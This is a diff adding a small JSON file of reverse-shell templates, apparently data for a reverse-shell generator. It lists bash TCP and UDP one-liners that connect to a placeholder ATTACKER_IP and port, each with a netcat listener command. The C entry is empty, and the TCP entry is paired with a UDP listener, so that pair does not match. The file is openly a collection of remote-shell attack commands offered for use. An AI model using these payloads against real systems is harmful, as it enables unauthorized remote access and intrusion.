@@ -1,0 +1,24 @@
+[
+    {
+      "name": "Bash TCP",
+      "uniqueID": 1,
+      "description": "Bash TCP Reverse Shell",
+      "reverseShell": "sh -i >& /dev/tcp/ATTACKER_IP/ATTACKER_PORT 0>&1",
+      "listener": "nc -u -lvp ATTACKER_PORT"
+
+    },
+    {
+      "name": "Bash UDP",
+      "uniqueID": 2,
+      "description": "Bash UDP Reverse Shell",
+      "reverseShell": "sh -i >& /dev/udp/ATTACKER_IP/ATTACKER_PORT 0>&1",
+      "listener": "nc -u -lvp ATTACKER_PORT"
+    },
+    {
+        "name": "C",
+        "UniqueID": 3,
+        "description": "C Reverse Shell",
+        "reverseShell": "",
+        "listener": "nc -u -lvp ATTACKER_PORT"
+      }
+  ]
